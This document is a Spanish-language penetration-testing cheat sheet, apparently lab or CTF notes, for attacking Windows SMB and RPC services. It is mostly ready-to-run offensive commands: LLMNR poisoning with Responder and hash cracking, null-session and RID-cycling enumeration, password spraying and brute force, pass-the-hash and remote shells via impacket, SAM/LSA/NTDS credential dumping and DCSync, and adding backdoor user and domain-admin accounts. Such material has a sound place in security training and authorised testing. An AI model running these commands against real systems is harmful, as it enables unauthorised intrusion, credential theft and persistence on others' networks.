# SMB (445) / RPC (135)

Tags: #SMB #RPC #PsExec  #Windows #Enum #Credentials #LateralMovement

## OBJETIVO
- Enumerar shares
- Encontrar credenciales
- Validar acceso
- Ejecutar código remoto (si aplica)
- Escalar / pivotar
## TIPS
1. **Si nxc falla → usa impacket**  
2. **Si enum4linux falla → usa rpcclient**  
3. **Si tienes creds → prueba TODO (SMB, WinRM, RDP, MSSQL)**

## TOOLS
* [NetExec](https://github.com/Pennyw0rth/NetExec)
* [Sprayhound](https://github.com/Hackndo/sprayhound)

---

## 0. /etc/hosts — ANTES DE EMPEZAR

Siempre agregar la máquina al /etc/hosts antes de enumerar SMB.

```bash
# Máquina standalone (solo Windows, sin dominio)
❯ echo "192.168.5.22 castelblack" >> /etc/hosts
# Solo el hostname → suficiente para conectarse

# Máquina parte de dominio o DC
❯ echo "192.168.5.22 castelblack.kingdoms.local castelblack" >> /etc/hosts
# hostname + FQDN → necesario para autenticación Kerberos y SMB con dominio
# Si solo agregas el hostname → algunas herramientas fallan con el dominio
```

### Cómo saber si es standalone o parte de dominio

```bash
❯ nmap -p 88 <IP>
# Puerto 88 (Kerberos) abierto → es un DC o parte de dominio
# Puerto 88 cerrado → probablemente standalone

❯ nxc smb <IP>
# Output muestra: domain → si el dominio es igual al hostname → standalone
# Si el dominio es diferente al hostname → parte de un dominio real
```

---
## 1. RECONOCIMIENTO / ENUMERACIÓN INICIAL (SIN CREDENCIALES)

```bash 
❯ responder -I eth0    # Inicia Responder en la interfaz indicada → escucha/broadcast y responde a queries LLMNR/NBT-NS y fuerza autenticación NTLMv2 

❯ hashcat -m 5600 hash_user.txt /usr/share/wordlists/rockyou.txt    # Crackear el NTLMv2
```

```bash
❯ nxc smb <IP/rango>
# Mapear toda la red 

❯ nxc smb <IP>  
# No requiere creds → muestra dominio, OS y SMB signing (clave para relay)  
  
❯ nxc smb <IP/rango> --gen-relay-list relay.txt  
# Requiere SMB signing OFF → genera lista de hosts vulnerables a NTLM relay

❯ nxc smb <IP> -u 'a' -p '' --shares 
❯ nxc smb <IP> -u 'guest' -p '' --shares
❯ nxc smb <IP> -u 'null' -p '' --shares
# Enumerar con null session al SMBv1/SMBv2 

❯ nxc smb <IP> -u '' -p '' --shares --users --pass-pol
# Todo en un solo comando con null session

❯ nxc smb <IP/rango> --gen-relay-list hosts_sin_signing.txt
# Mapear toda la red buscando hosts sin SMB signing (clave para relay attacks)

❯ nmblookup -A <IP>  
# No requiere creds → obtiene NetBIOS (hostname + posible dominio)  
  
❯ smbclient -L <IP> -N  
# Requiere null session → lista shares anónimos (si IPC$ permite acceso)  
  
❯ smbclient -L <IP> -N --option='client min protocol=NT1'  
# Fuerza SMBv1 → útil en targets legacy donde falla SMBv2/3  
  
❯ smbmap -H <IP> --no-banner  
# No requiere creds → enum rápida de shares y permisos (READ/WRITE)  
  
❯ smbmap -H <IP> -u '' -p ''  
# Null session explícita → confirma acceso anónimo  
  
❯ smbmap -H <IP> -u 'guest' -p ''  
# Prueba usuario guest → a veces tiene más permisos que null  
```
### Insight importante
- Si **null session funciona → PRIORIDAD ALTA**
- Si ves shares → entra inmediatamente

---
## 2. ENUMERACIÓN DE SHARES

```bash 
❯ smbmap -H <IP> -r <share>
# Requiere READ → lista contenido del share (rápido, sin interactivo)

❯ smbmap -H <IP> -R <share>
# Requiere READ → enum recursiva (más ruido pero más cobertura)

❯ smbmap -H <IP> -r 'dir uno'
# Requiere READ → enum de un directorio específico

❯ smbmap -H <IP> -r sysvol
# SYSVOL (AD) → scripts/GPP → alto valor para credenciales

❯ smbclient //<IP>/<share> -N
# Requiere null session → acceso interactivo al share

❯ smbclient //<IP>/<share> -U 'guest'
# Acceso como guest → puede ampliar permisos

❯ smbclient //<IP>/<share> -U 'user%pass'
# Requiere creds válidas → acceso interactivo autenticado

❯ smbclient -L <IP> -U 'user'
# Requiere creds → lista shares visibles para el usuario

❯ smbclient -U user //<IP>/ShareName      # Requiere creds → acceso directo al share
	❯ dir             # Listar contenido del share
	❯ get <file>      # Descargar archivo
	❯ put <file>      # Subir archivo (si hay permisos de escritura)
	❯ prompt
	❯ mget *          # Descargar todos los archivos sin confirmación
	❯ more <file>     # Leer archivos directamente

Notas:
	1. D - Directory
	2. DH - Hidden Directory
	3. H - Hidden File 
	4. N - Normal File 
```
### Condiciones clave
- READ → puedes descargar
- WRITE → puedes subir (posible RCE indirecto)

---
## 3. DESCARGA Y ANÁLISIS 

```bash 
❯ smbmap -H <IP> --download anonymous/file.txt
# Requiere READ → descarga archivo específico

❯ smbmap -H <IP> -r sysvol -A file.txt -q
# Requiere READ → busca patrones y descarga coincidencias (ej: passwords)

❯ smbmap -H <IP> --download 'C$\flag.txt'
# Requiere creds válidas → acceso a disco administrativo

❯ smbmap -H <IP> -u 'user' -p 'pass' -r 'C$'
# Requiere creds → enum de disco (C$)

❯ smbmap -H <IP> -u 'user' -p 'pass' -R 'dir uno'
# Requiere creds → enum recursiva autenticada

❯ mount -t cifs //<IP>/<share> /tmp/mnt -o username=null,password=null,rw
# Requiere null session → montar share local para análisis cómodo

❯ mount -t cifs //<IP>/<share> /tmp/mnt -o username=user,password=pass,domain=,rw
# Requiere creds → montar share autenticado

❯ tree
❯ tree -fas
# Visualizar estructura (rutas completas/permisos)

❯ umount /tmp/mnt
# Desmontar share
```
### Insight
- Si puedes montar → revisa TODO (scripts, backups, configs)

---
## 3.5 ANÁLISIS DE ARCHIVOS (POST-DESCARGA)

```bash 
# Buscar credenciales en share montado
❯ grep -ri "passw\|cred\|secret\|key\|pwd" /tmp/mnt/ 2>/dev/null

❯ grep -ri "passw\|cred\|secret\|key\|pwd" /tmp/mnt/ \
  --include="*.txt" \
  --include="*.xml" \
  --include="*.config" \
  --include="*.ini" \
  --include="*.ps1" \
  --include="*.bat"

# Buscar tipos de archivos interesantes
❯ find /tmp/mnt -name "*.xml" \
  -o -name "*.config" \
  -o -name "*.ini" \
  -o -name "*.txt" \
  -o -name "*.ps1" \
  -o -name "*.bat" \
  -o -name "*.bak" \
  2>/dev/null

# Buscar archivos modificados recientemente (últimos 90 días)
❯ find /tmp/mnt -mtime -90 -type f 2>/dev/null

# GPP — si tienes acceso a SYSVOL
❯ find /tmp/mnt -name "Groups.xml" 2>/dev/null
❯ grep -ri "cpassword" /tmp/mnt/ 2>/dev/null

# Si encuentras cpassword → desencriptar con:
❯ gpp-decryp "cpassword"
```
### Insight
- `.config` y `.xml` → credenciales de servicios/apps
- `.ps1` y `.bat` → hardcoded passwords frecuentes
- `Groups.xml` en SYSVOL → GPP creds (MS14-025)
- Archivos recientes → más probabilidad de creds activas

---
## 4. ENUMERACIÓN DE USUARIOS / DOMINIO

```bash 
❯ nxc smb <IP> --users    
# Enumerar usuarios 

❯ enum4linux <IP> -a
# No requiere creds → enum legacy (puede fallar en AD modernos)

❯ enum4linux-ng <IP> -A
# No requiere creds → versión moderna (mejor cobertura en AD)

❯ enum4linux <IP> -U
# Usuarios

❯ enum4linux <IP> -S
# Shares

❯ enum4linux <IP> -G
# Grupos

❯ enum4linux <IP> -o
# OS info

❯ enum4linux <IP> -i
# Impresoras

❯ enum4linux <IP> -a -U ''
# Usuarios con null session

❯ enum4linux -a -u "admin" -p 'password' <IP>
# Requiere creds → enum más completa
```
### Limitación
- enum4linux falla en entornos modernos → usa nxc mejor

---
## 5. RPC ENUM (CLAVE)

```bash 
❯ rpcclient -U "" <IP>
# Requiere IPC$ abierto → intenta null session

❯ rpcclient -U "" <IP> -N
❯ rpcclient -U "Domain01\\" <IP> -N
# Fuerza null sin password (útil cuando pide pass)

❯ rpcclient -U "guest%" <IP>
# Acceso guest → a veces permitido

❯ rpcclient -U 'user%pass' <IP>      # Requiere creds → acceso completo RPC
	❯ help
	❯ ?                     # Lista comandos disponibles dentro de rpcclient
	❯ srvinfo               # Info del sistema (OS, versión)
	❯ querydominfo          # Info del dominio (SID base)
	❯ enumdomusers          # Lista usuarios con RID
	❯ enumdomgroups         # Lista grupos con RID
	❯ enumprinters          # Enum impresoras
	❯ queryuser 0x1f4       # Info de usuario por RID (0x1f4 = Administrator típico)
	❯ queryuser username    # Info de usuario por nombre
	❯ querydispinfo         # Descripciones (a veces contienen credenciales)
	❯ querygroupmem 0x200   # Miembros del grupo Administrators (RID 0x200 típico)
	❯ lookupnames admin     # Obtiene SID completo del usuario
	❯ netshareenumall       # Enum shares vía RPC
	❯ getdompwinfo          # Política de contraseñas del dominio
	❯ getusrdompwinfo 0x1f4 # Política de contraseña de un usuario específico
	❯ dsroledominfo         # Rol del servidor (DC, member server, etc.)
```

```bash 
❯ rpcclient -U 'user%pass' <IP> -c 'enumdomusers'
# Ejecuta comando RPC sin entrar a shell interactiva

❯ rpcclient -U 'user%pass' <IP> -c 'enumdomgroups'
# Enum grupos vía RPC

❯ rpcclient -U 'user%pass' <IP> -c 'queryuser 0x1f4'
# Info de usuario admin

❯ rpcclient -U 'user%pass' <IP> -c 'querydispinfo'
# Descripciones (posibles leaks)

❯ rpcclient -U 'user%pass' <IP> -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users.txt
# Extrae usuarios a archivo → útil para spraying
```

```bash 
❯ net rpc group members 'Domain Users' -W 'DOMAIN01' -I 'IP' -U '%'    # Enumerar todos los usuarios del dominio
```

---
## 6. RID CYCLING (SIN CREDS)

```bash 
❯ nxc smb <IP> -u 'guest' -p '' --rid-brute 10000
# Más rápido y limpio que el loop manual con rpcclient
# El 10000 define hasta qué RID buscar
```

```bash 
❯ impacket-lookupsid anonymous@<IP>
# No requiere creds → enum de usuarios vía SID (más confiable que rpcclient)

❯ rpcclient -U 'guest%' <IP> -c 'lookupnames administrator'
# Obtiene SID base del dominio (para construir rangos)

❯ seq 400 2000 | xargs -P 50 -I {} rpcclient -U 'guest%' <IP> -c 'lookupsids S-1-5-21-XXXX-{}' | grep -v unknown
# Fuerza bruta de RIDs → enum usuarios sin creds


Notas:
	- S-1-5-21-4078382237-1492182817-2568127209-500 donde:
		- SID = S-1-5-21-4078382237-1492182817-2568127209 = Identificador del usuario, objeto, grupo 
		- RID = 500
```

---
## 7. VALIDACIÓN DE CREDENCIALES

```bash 
❯ nxc smb <IP> -u 'user' -p 'pass'
# Valida creds → [Pwn3d!] indica admin local

❯ nxc smb <IP> -u 'user' -H 'hash'
# Pass-the-Hash → usa NT hash (no LM)

❯ smbmap -H <IP> -u 'user' -p 'pass'
# Ver permisos de shares con ese usuario

❯ smbmap -H <IP> -d domain.com -u 'user' -p 'pass'
# Autenticación contra dominio

❯ smbmap -H <IP> -u "" -p ""
# Test de credenciales vacías
```
### Insight
- Credencial válida ≠ privilegios
- Necesitas verificar si es:
    - usuario normal
    - admin
    - servicio

---
## 8. ATAQUES (SPRAYING / ENUM)

```bash 
❯ nxc smb <IP> -u users.txt -p passwd.txt --continue-on-success
# Fuerza bruta → cuidado con lockout

❯ nxc smb <IP> -u users.txt -p passwd.txt --continue-on-success --no-bruteforce
# Paraleliza pruebas (más rápido)
# --no-bruteforce → probar de forma paralela los diccionario 

❯ nxc smb <IP> -u users.txt -p users.txt --no-bruteforce
# Password spraying con dos diccionario 

❯ nxc smb <IP> -u users.txt -p 'Password1' --continue-on-success
# Password spraying → más sigiloso

❯ nxc smb <IP> -u users.txt -p ''
# Prueba passwords vacíos

❯ nxc smb <IP> -u users.txt -H 'hash'
# Hash spraying

❯ nxc smb <IP> -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
# Enum usuarios válidos por RID
```

```bash 
# No autenticado 
# Single user, single password
sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP>

# User list, single password
sprayhound -U ./users.txt -p Pentest123.. -d Domain01.local -dc <IP>

# User as pass
sprayhound -U ./users.txt -d Domain01.local -dc <IP>

# User as pass with password lowercase
sprayhound -U ./users.txt --lower -d Domain01.local -dc <IP>

# User as pass with password uppercase
sprayhound -U ./users.txt --upper -d Domain01.local -dc <IP>
```

```bash 
# Autenticado 
# Single user, single password
sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# All domain users, single password
sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# All domain users, single password, using an account from a trusted domain
sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu 'babdcatha.net\Babd' -lp P4ssw0rd

# User as pass on all domain users
sprayhound -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# User as pass with password lowercase
sprayhound --lower -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# User as pass with password uppercase
sprayhound --upper -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
```

```bash 
❯ hydra -L users.txt -P pass.txt smb://<IP>
# Alternativa de brute force
# Limitación: puede fallar con SMBv1 / configs modernas
# Hydra no es compatible con la version 'SMBv1', el que si lo puede hacer con todas la versiones es 'Metasploit'
```
### Condiciones
- Lockout policy → cuidado con brute force
- RID brute → no requiere creds

---
## 9. ENUMERACIÓN AVANZADA (CON CREDENCIALES)

```bash 
❯ nxc smb <IP> -u 'user' -p 'pass' --shares
# Shares accesibles

❯ nxc smb <IP> -u 'user' -p 'pass' --users
# Usuarios del dominio

❯ nxc smb <IP> -u 'user' -p 'pass' --pass-pol
# Política de contraseñas (lockout, longitud, etc.)

❯ nxc smb <IP> -u 'user' -p 'pass' --spider <share> --regex .
# Búsqueda recursiva de archivos

❯ nxc smb <IP> -u 'user' -p 'pass' --laps
# Requiere pertenecer a LAPS_Readers → obtiene passwords locales

❯ nxc smb <IP> -u 'user' -p 'pass' --ntds
# Requiere privilegios AD (GetChanges + GetChangesAll) → DCSync

❯ nxc smb <IP> -u 'user' -p 'pass' --sam
# Requiere admin local → dump de cuentas locales

❯ nxc smb <IP> -u 'user' -p 'pass' --groups
# Grupos locales y del dominio

❯ nxc smb <IP> -u 'user' -p 'pass' --local-users
# Usuarios locales (distinto a --users que es del dominio)

❯ nxc smb <IP> -u 'user' -p 'pass' --sessions
# Sesiones activas — útil para ver qué usuarios están logueados

❯ nxc smb <IP> -u 'user' -p 'pass' --loggedon-users
# Usuarios logueados actualmente (clave para decidir dónde hacer token impersonation)

❯ nxc smb <IP> -u 'user' -p 'pass' --disks
# Discos disponibles
```

---
## 10. EJECUCIÓN REMOTA

```bash 
Jerarquía de preferencia para ejecución remota: 
1. evil-winrm → más cómodo, da shell interactiva limpia 
2. impacket-psexec → shell SYSTEM, crea servicio (más ruido) 
3. impacket-wmiexec → más sigiloso, no crea servicio 
4. impacket-smbexec → cuando los otros fallan 
5. nxc -x → para comandos puntuales sin shell
```

```bash 
❯ nxc smb <IP> -u 'user' -p 'pass' -x 'ipconfig'
# Ejecutar comando
# Requiere: ADMIN LOCAL

❯ nxc smb <IP> -u 'user' -p 'pass' -x 'dir C:\\'
# Acceso a filesystem

❯ nxc smb <IP> -u 'user' -p 'pass' -x 'type C:\\file.txt'
# Leer archivos

❯ nxc smb <IP> -u 'user' -p 'pass' -x 'net user omar Password1 /add'
# Crear usuario (persistencia)

❯ nxc smb <IP> -u 'user' -p 'pass' -x 'net group "domain admins" omar /add'
# Escalada (solo si ya eres admin del dominio)

❯ smbmap -H <IP> -u 'user' -p 'pass' -x 'ipconfig'
# Alternativa
```

```bash 
❯ impacket-atexec domain/user:'pass'@<IP> "whoami"
# Ejecución vía Task Scheduler — más sigiloso que psexec 

❯ impacket-psexec -port 445 domain/user@<IP> -hashes :NThash 
# Especificar puerto cuando el default falla

❯ impacket-psexec domain.corp/Administrator:Password@<IP> cmd.exe
# Requiere credenciales válidas + admin local
# Crea servicio → devuelve shell como NT AUTHORITY\SYSTEM

❯ impacket-psexec domain.corp/Administrator@<IP> cmd.exe
# Variante cuando ya tienes contexto de credenciales (ej: Kerberos / cache)

❯ impacket-psexec administrator@<IP> cmd.exe
# Usuario local (no dominio)

❯ impacket-psexec domain.corp/'Administrator'@<IP> -hashes :NT
# Pass-the-Hash → solo necesitas NT hash (no password)
# Requiere admin local

❯ impacket-smbexec 'Administrator'@<IP> -hashes LM:NT
# Alternativa a psexec
# Más estable en algunos entornos pero menos interactivo

❯ impacket-wmiexec 'Administrator'@<IP> -hashes LM:NT
# Más sigiloso (no crea servicio)
# Requiere admin local

❯ impacket-wmiexec domain.corp/Administrator@<IP> -no-pass -hashes LM:NT
# Variante con dominio
# -no-pass → indica que usas hash, no password

❯ impacket-psexec user:pass@<IP>
# Shell SYSTEM
# Requiere admin local

❯ impacket-smbexec user:pass@<IP>
	❯ dir C:\Users     # No te deja usar el comando 'cd'
# Alternativa cuando psexec falla

❯ impacket-wmiexec user:pass@<IP>
# Más sigiloso (no crea servicio)

❯ pth-winexe -U 'domain/user%LM:NT' //<IP> cmd.exe
# El hash debe de ir como 'LM:NT'
# Pass-the-Hash remoto
# Requiere:
# - credenciales admin
# - SMB accesible
```

---
## 11. DUMP DE CREDENCIALES

```bash 
❯ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# Cuando tienes los archivos SAM/SYSTEM descargados físicamente
# (backups, VSS, etc.) — no necesitas conectividad al host

❯ nxc smb <IP> -u 'user' -p 'pass' --lsa
# LSA secrets — a veces tiene creds en claro de servicios

❯ nxc smb <IP> -u 'user' -p 'pass' --ntds
# Dump de NTDS → requiere privilegios AD altos

❯ nxc smb <IP> -u 'user' -H 'hash' --ntds
# Igual pero con hash

❯ nxc smb <IP> -u 'user' -p 'pass' --sam
# Dump local → requiere admin

❯ impacket-secretsdump 'user':'pass'@<IP> -history -pwd-last-set
# Dump completo → incluye historial y fechas

❯ impacket-secretdump -just-dc domain.corp/'user':passwd@<IP> -history -pwd-last-set
# DCSync → requiere privilegios AD:
# - GetChanges
# - GetChangesAll
# Muestra:
# - hashes
# - historial de passwords
# - última modificación
```

---
## 12. MOVIMIENTO LATERAL

```bash 
❯ nxc winrm <IP> -u 'user' -p 'pass'
# Requiere grupo "Remote Management Users" → acceso remoto 
# Muestra [Pwn3d!]

❯ nxc winrm <IP> -u 'user' -p 'pass' -d domain -x 'whoami'
# Ejecución remota vía WinRM

❯ nxc mssql <IP> -u 'sa' -p '' 
❯ nxc mssql <IP> -u 'sa' -p 'sa' 
❯ nxc mssql <IP> -u 'sa' -p 'admin'
# Verificar si sa está habilitado y sin contraseña

❯ nxc mssql <IP> -u 'sa' -p /usr/share/wordlists/rockyou.txt
# Fuerza bruta al usuario sa

❯ nxc mssql <IP> -u sa -p passwd.txt --local-auth
# Ataque MSSQL local

❯ nxc mssql <IP> -u users.txt -p passwords.txt --continue-on-success
# Verificar varios usuarios clásicos de MSSQL de una vez 

❯ nxc mssql <IP> -u user.txt -p passwd.txt --continue-on-success --local-auth
# Fuerza bruta MSSQL

❯ nxc ldap <IP> 'user' -p 'pass'
# Enumeración LDAP


NOTA: Los usuarios por defecto de MSSQL que siempre vale probar:
	sa → System Administrator → el más importante 
	admin → común en instalaciones antiguas 
	administrator
```

---
## 13. CASOS ESPECIALES

```bash 
❯ smbpasswd -r <IP> -U 'user'
# Cambio de contraseña obligatorio
```

```bash 
❯ net rpc password "TargetUser" "NewPass123!" -U "domain/user%pass" -S <IP>
# Cambiar contraseña
# Requiere:
# - GenericAll
# - ForceChangePassword
```

---
## CONDICIONES CLAVE
- Null session → enum sin creds
- Creds válidas → acceso ampliado
- Admin local → ejecución remota
- Permisos AD → DCSync

## ONE-LINERS MENTALES
- SMB abierto → probar null session
- Share accesible → buscar credenciales
- Credenciales → reutilizar en TODO
- [Pwn3d!] → ejecutar comandos ya
- SYSVOL → revisar scripts

